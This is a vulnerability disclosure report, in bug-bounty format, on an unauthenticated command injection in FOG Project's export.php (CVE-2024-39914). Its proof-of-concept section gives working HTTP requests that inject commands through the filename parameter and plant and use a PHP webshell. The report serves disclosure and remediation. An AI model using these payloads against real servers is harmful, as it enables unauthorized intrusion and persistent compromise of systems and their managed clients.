# Title: Unauthenticated Command Injection in FOG Project (CVE-2024-39914)

- **Platform**: Intigriti
- **Program**: FOG Project
- **Severity**: Critical (CVSS 9.8)
- **Date**: 2024-10-09
- **Researcher**: OffSec Team
- **Bounty**: N/A

## Summary
A critical unauthenticated command injection vulnerability was discovered in FOG Project versions <= 1.5.10.34. The `export.php` script passed the `filename` parameter to a system command without sanitization, allowing attackers to execute arbitrary commands or deploy persistent webshells.

## Technical Details
The `export.php` script within the `fog/management/` directory processes the `filename` parameter by passing it to a backend shell command via `shell_exec()` or similar function. Input validation was completely absent, allowing command injection via shell metacharacters like `$()`, backticks, and semicolons.

The filename parameter could be used to both execute commands and write arbitrary content to the filesystem.

## Steps to Reproduce
1. Identify a FOG Project instance (version <= 1.5.10.34)
2. Send a crafted POST request to `/fog/management/export.php`
3. Inject commands in the `filename` parameter
4. Command output is returned or can be retrieved via other means

## Proof of Concept
```
POST /fog/management/export.php?filename=$(id)&type=pdf HTTP/1.1
Host: fog.example.com
Content-Type: application/x-www-form-urlencoded

fogguiuser=fog&nojson=2

# Webshell deployment
POST /fog/management/export.php?filename=$(echo '<?php system($_GET["cmd"]); ?>' > WEBSHELL)&type=pdf HTTP/1.1
Host: fog.example.com

# Access webshell
GET /fog/management/WEBSHELL?cmd=id HTTP/1.1
Host: fog.example.com
```

## Impact
- Unauthenticated remote code execution
- Full server compromise
- Persistent access via webshell
- Access to managed client systems

## Remediation
FOG Project released version 1.5.10.35 with proper input validation and corrected shell execution logic. The vendor also recommended restricting access to the management interface from public networks.

## References
- https://www.offsec.com/blog/cve-2024-39914/
- CVE-2024-39914
